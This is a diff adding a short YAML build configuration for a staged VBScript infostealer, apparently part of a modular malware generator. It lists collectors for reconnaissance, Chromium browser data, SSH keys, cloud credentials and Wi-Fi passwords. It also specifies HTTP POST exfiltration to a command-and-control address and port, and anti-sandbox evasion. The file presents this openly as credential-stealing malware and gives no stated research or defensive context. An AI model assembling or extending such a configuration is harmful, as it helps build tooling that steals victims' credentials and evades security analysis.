@@ -1,0 +1,32 @@
+name: vbs_infostealer_staged
+description: Two-stage VBScript infostealer - quick recon first, deep collection second
+format: vbscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+stage1_collectors:
+  - collectors/sysinfo
+  - collectors/processes
+  - collectors/security_products
+  - collectors/network
+
+stage2_collectors:
+  - collectors/browser_chromium
+  - collectors/ssh_keys
+  - collectors/cloud_creds
+  - collectors/wifi_passwords
+  - collectors/installed_software
+
+exfil: exfil/http_post
+arch: arch/staged
+
+evasion:
+  - evasion/anti_sandbox
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  STAGE2_DELAY: "15000"
